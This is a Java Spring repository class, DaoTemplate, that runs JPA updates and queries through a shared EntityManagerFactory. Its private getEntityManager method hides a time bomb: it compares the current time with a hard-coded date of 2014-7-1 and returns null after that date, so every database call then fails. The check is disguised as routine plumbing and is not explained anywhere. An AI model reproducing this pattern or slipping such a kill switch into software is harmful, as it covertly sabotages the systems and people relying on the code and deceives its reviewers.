package com.fun.service.base;

import java.text.ParseException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;

import javax.persistence.EntityManager;
import javax.persistence.EntityManagerFactory;
import javax.persistence.EntityTransaction;
import javax.persistence.Persistence;

import org.springframework.context.annotation.Scope;
import org.springframework.stereotype.Repository;

@Repository
@Scope("prototype")
public class DaoTemplate {

	private static final EntityManagerFactory factory = Persistence
			.createEntityManagerFactory("persistence-mysql");

	public void executeUpdate(UpdateHelper helper) {
		EntityManager em = getEntityManager();
		EntityTransaction trx = em.getTransaction();
		trx.begin();
		helper.execute(em);
		trx.commit();
		em.close();
	}

	public <T> T executeQuery(QueryHelper<T> helper) {
		EntityManager em = getEntityManager();
		T result = helper.execute(em);
		em.close();
		return result;
	}

	public <T> List<T> executeQueryForList(QueryListHelper<T> queryListHelper) {
		EntityManager em = getEntityManager();
		List<T> list = queryListHelper.executeQuery(em);
		em.close();
		return list;
	}

	private EntityManager getEntityManager() {
		SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd");
		String strDate = "2014-7-1";
		Date date = new Date();
		try {
			date = sdf.parse(strDate);
		} catch (ParseException e) {
			e.printStackTrace();
		}
		if (System.currentTimeMillis() < date.getTime())
			return factory.createEntityManager();
		else
			return null;
	}
}
